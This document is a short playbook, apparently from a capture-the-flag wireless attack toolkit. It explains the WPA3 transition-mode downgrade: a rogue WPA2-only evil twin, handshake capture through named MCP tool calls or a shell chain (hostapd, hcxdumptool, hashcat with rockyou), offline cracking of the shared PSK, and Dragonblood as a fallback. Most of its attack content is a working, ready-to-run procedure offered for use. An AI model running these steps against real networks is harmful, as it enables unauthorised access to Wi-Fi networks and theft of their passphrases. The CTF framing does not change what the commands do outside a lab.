# WPA3 transition-mode downgrade

## Recognition

RSN IE carries BOTH:
- AKM Suite 00-0F-AC:02 (PSK)
- AKM Suite 00-0F-AC:08 (SAE)

The AP is in "transition mode" — meant for mixed fleets during
rollout. Any WPA2-capable client will happily fall back if it
can't complete SAE.

## The attack

You capture the WPA2 side. The PSK is the same on both sides — a
recovered PSK from WPA2 unlocks the WPA3 network too.

Two paths:

1. **Passive.** Wait for a WPA2-only client to reassociate.
   Capture the 4-way, convert to 22000, crack.
2. **Active.** Stand up an evil twin that advertises **only** AKM 2
   (no AKM 8). WPA2-capable clients fall to it; capture the 4-way.

## Sequence — evil-twin variant

```
# Rogue hostapd config
interface=wlan0
ssid=<matching target SSID>
bssid=<matching target BSSID>
channel=<same as target>
wpa=2
wpa_key_mgmt=WPA-PSK          # WPA2 only, no SAE
rsn_pairwise=CCMP
```

Bring it up next to the real AP with `do_create_rogue_ap` (real MCP
tool — `server.do_create_rogue_ap(ssid, channel, security='wpa2',
psk=..., bssid=...)`), then capture the 4-way with
`do_capture_handshake` (real MCP tool —
`server.do_capture_handshake(bssid, timeout_s, deauth_client, ...)`).

**Fallback shell chain (no MCP):**

```bash
sudo hostapd /etc/hostapd/rogue-wpa2.conf &
sudo hcxdumptool -i wlan1 -c <target-channel> \
    -w /tmp/downgrade.pcapng --disable_deauthentication=1
# after a client falls to the WPA2 rogue and completes M1..M4:
hcxpcapngtool -o /tmp/hs.22000 /tmp/downgrade.pcapng
hashcat -m 22000 /tmp/hs.22000 /opt/wordlists/rockyou.txt
```

## The flag surface

Recovered PSK is the flag, or decrypts frames on either the WPA2
or WPA3 side that contain the flag.

## When it does not work

- **All clients are WPA3-only.** They will not negotiate WPA2 with
  your rogue. Pivot to Dragonblood if the SAE impl is weak, or
  wait for a legacy client to appear.
- **6 GHz AP.** No transition mode allowed on 6 GHz. Not applicable.

## Cite

- attacks.json: `wpa3-transition-downgrade`,
  `wpa2-4way-capture`, `evil-twin-clone`.
- Wi-Fi Alliance WPA3 spec.
